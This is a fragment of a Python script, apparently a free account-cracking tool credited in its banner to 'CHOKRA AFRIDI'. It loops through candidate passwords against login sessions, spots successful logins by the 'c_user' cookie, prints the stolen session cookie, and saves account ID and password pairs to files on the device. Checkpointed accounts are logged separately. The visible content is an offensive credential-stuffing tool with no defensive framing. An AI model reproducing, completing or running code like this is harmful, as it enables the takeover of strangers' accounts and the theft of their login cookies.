...
\x1b[1;97m[*]----------------------------------------------
\033[1;31m. [*] Author        : CHOKRA AFRIDI
\033[1;37m[*] Github        : 
\033[1;37m[*] Status        : FREE
\033[1;37m[*] TEAM          : SINGLE
\033[1;35m.[*] UPDATE BY     : CHOKRA AFRIDI
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[CHOKRA-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [COOKIE] {coki}")
                open('/sdcard/CHOKRA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[CHOKRA-CP-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/CHOKRA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|CHOKRA-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
